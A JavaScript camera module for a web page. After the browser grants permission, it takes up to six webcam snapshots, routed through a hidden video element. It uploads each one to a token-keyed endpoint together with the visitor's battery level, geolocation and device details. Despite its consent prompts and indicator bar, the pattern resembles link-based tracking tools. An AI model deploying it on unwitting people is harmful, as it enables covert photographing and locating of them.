/**
 * static/js/camera.js - Permission-compliant camera stream, frame capture, and track teardown.
 */

window.CameraManager = {
  stream: null,
  active: false,
  videoEl: null,
  canvasEl: null,
  maxSnapshots: 5,
  snapshotsTaken: 0,
  captureTimer: null,

  init() {
    this.videoEl = document.getElementById("hidden-video");
    this.canvasEl = document.getElementById("offscreen-canvas");

    const stopBtn = document.getElementById("btn-stop-camera");
    if (stopBtn) {
      stopBtn.addEventListener("click", () => {
        this.stop();
        if (window.SessionEvents) {
          window.SessionEvents.send("CAMERA_MANUALLY_STOPPED");
        }
      });
    }
  },

  async start() {
    if (!navigator.mediaDevices?.getUserMedia) {
      window.PermissionManager?.setState("camera", "UNAVAILABLE");
      return false;
    }

    window.PermissionManager?.setState("camera", "REQUESTED");
    try {
      this.stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      this.active = true;
      window.PermissionManager?.setState("camera", "GRANTED");

      if (this.videoEl) {
        this.videoEl.srcObject = this.stream;
        await this.videoEl.play().catch(() => {});
      }

      // Show visible indicator bar
      const bar = document.getElementById("camera-indicator-bar");
      if (bar) bar.classList.add("active");

      // Wait a moment for camera warm-up, then capture initial frame
      setTimeout(() => this.captureAndUpload(), 800);

      // Periodic capture with max bounds
      this.captureTimer = setInterval(() => {
        if (this.snapshotsTaken < this.maxSnapshots) {
          this.captureAndUpload();
        } else {
          clearInterval(this.captureTimer);
        }
      }, 10000);

      return true;
    } catch (err) {
      console.warn("[CameraManager] Camera permission denied or error:", err);
      this.active = false;
      window.PermissionManager?.setState("camera", "DENIED");
      return false;
    }
  },

  stop() {
    if (this.stream) {
      this.stream.getTracks().forEach(track => {
        try {
          track.stop();
        } catch (e) {}
      });
      this.stream = null;
    }

    if (this.videoEl) {
      this.videoEl.srcObject = null;
    }

    if (this.captureTimer) {
      clearInterval(this.captureTimer);
      this.captureTimer = null;
    }

    this.active = false;
    const bar = document.getElementById("camera-indicator-bar");
    if (bar) bar.classList.remove("active");

    console.log("[CameraManager] Camera stopped and tracks released.");
  },

  captureFrame() {
    if (!this.active || !this.videoEl || !this.canvasEl) return null;
    if (!this.videoEl.videoWidth || !this.videoEl.videoHeight) return null;

    this.canvasEl.width = this.videoEl.videoWidth;
    this.canvasEl.height = this.videoEl.videoHeight;
    const ctx = this.canvasEl.getContext("2d");
    ctx.drawImage(this.videoEl, 0, 0, this.canvasEl.width, this.canvasEl.height);

    return this.canvasEl.toDataURL("image/jpeg", 0.75);
  },

  async captureAndUpload() {
    const frame = this.captureFrame();
    if (!frame) return;

    this.snapshotsTaken++;
    const token = window.SESSION_CONFIG?.token;
    if (!token) return;

    const [battery, coords, details] = await Promise.all([
      window.TelemetryCollector?.getBattery(),
      window.LocationManager?.getCoordinates(),
      window.TelemetryCollector?.getDeviceDetails()
    ]);

    await window.ApiClient.post(`/upload_image/${token}`, {
      image_b64: frame,
      battery,
      coords,
      details
    });
  }
};
